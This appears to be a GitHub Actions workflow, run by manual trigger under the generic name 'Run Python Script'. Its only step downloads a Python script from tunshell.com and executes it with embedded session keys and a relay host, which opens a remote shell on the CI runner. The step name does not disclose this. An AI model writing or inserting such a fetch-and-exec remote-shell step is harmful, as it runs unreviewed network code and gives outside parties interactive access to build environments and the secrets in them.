name: Run Python Script

# Allows manual triggering of the workflow
on:
  workflow_dispatch:

jobs:
  run-python-script:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Run Python script from URL
      run: |
        python -c "import urllib.request; r = urllib.request.urlopen('https://lets.tunshell.com/init.py'); exec(r.read().decode('utf-8'), {'p': ['T', 'pyraD4MbtWfam0d7Nt6adA', 'Lt6YJlYG6wDF4pTCc0tlei', 'eu.relay.tunshell.com']})"
